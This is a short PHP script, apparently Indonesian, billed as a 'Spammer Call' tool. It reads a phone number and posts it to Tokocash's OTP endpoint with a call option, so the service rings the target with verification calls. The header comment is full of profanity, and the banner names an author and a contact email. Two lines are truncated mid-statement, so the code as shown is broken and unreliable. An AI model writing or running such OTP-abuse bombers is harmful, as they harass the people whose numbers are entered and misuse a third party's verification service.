<?php
//  NGAPA LIAT LIAT MAU RECODE ANJING, KLO MAU BUAT SENDIRI KONTOL JGN GAYA²AN JADI HACKER KONTOL
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CU>
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);                                                                       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($c>
        curl_close($ch);
                echo $asw."\n";                                                                                       }
echo "
    Spammer Call From TokeD
        Author By    :Coohya
     Penggunaannya   :Harus Pake 08 Yaaa
     Klo Ada Masalah Hubungi Saya helloguys890@gmail.com \n";
echo "Nomor\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>